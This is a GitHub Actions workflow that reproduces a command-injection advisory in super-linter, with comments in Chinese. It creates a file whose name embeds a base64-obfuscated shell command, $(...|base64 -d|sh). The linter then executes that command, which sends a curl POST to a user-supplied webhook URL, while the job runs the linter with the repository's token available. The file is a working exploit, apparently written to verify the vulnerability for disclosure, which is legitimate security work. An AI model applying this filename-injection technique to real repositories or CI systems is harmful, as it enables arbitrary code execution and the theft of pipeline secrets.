name: Security Repro - GHSA-r79c-pqj3-577x

on:
  workflow_dispatch:
    inputs:
      target_version:
        description: 'The tag of super-linter to test (e.g., v7, v8, slim-v8.2.1)'
        required: true
        default: 'v7'
      webhook_url:
        description: 'Your webhook.site URL to receive the callback'
        required: true
        default: 'https://webhook.site/YOUR-UUID-HERE'

jobs:
  repro-exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4
        with:
          # 必须拉取完整历史，否则 checkout -b 可能会出问题（虽然通常不用，但为了保险）
          fetch-depth: 0

      - name: 1. Generate Malicious Filename (The Exploit)
        run: |
          # 构造 Payload
          ATTACK_CMD="curl -fsS -X POST \"${{ inputs.webhook_url }}\" -d \"vulnerable_version=${{ inputs.target_version }}\""
          ENCODED_CMD=$(echo -n "$ATTACK_CMD" | base64 -w0)
          
          # Base64 编码文件名，避免路径斜杠报错
          PAYLOAD="pre\$(echo $ENCODED_CMD|base64 -d|sh).md"
          
          echo "Payload Filename: $PAYLOAD"
          touch "$PAYLOAD"

      - name: 2. Fix Git Environment (Critical Step)
        run: |
          # 【关键修复】
          # Super-Linter 的 InitializeDefaultBranch 函数在 RUN_LOCAL=true 时强行检查 'master' 分支。
          # GHA checkout 默认是 Detached HEAD，所以我们手动创建一个 master 分支来欺骗它。
          git checkout -b master
          
      - name: 3. Run Super-Linter via Docker
        run: |
          echo "Testing against image version: ${{ inputs.target_version }}"
          
          # 1. RUN_LOCAL=true: 必须开启，否则脚本会尝试读取 GHA Event JSON，导致更复杂的报错。
          # 2. VALIDATE_ALL_CODEBASE=true: 告诉它不要去算 Diff，而是扫描所有文件（直接触发 find）。
          #    虽然上面的函数没用到这个变量，但主流程里需要它来跳过 git diff 计算。
          
          docker run --rm \
            -e RUN_LOCAL=true \
            -e VALIDATE_ALL_CODEBASE=true \
            -e GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }} \
            -v "$(pwd):/tmp/lint" \
            ghcr.io/super-linter/super-linter:${{ inputs.target_version }}
            
      - name: 4. Check Result
        if: always()
        run: |
          echo "Test finished. Please check ${{ inputs.webhook_url }} for the ping."
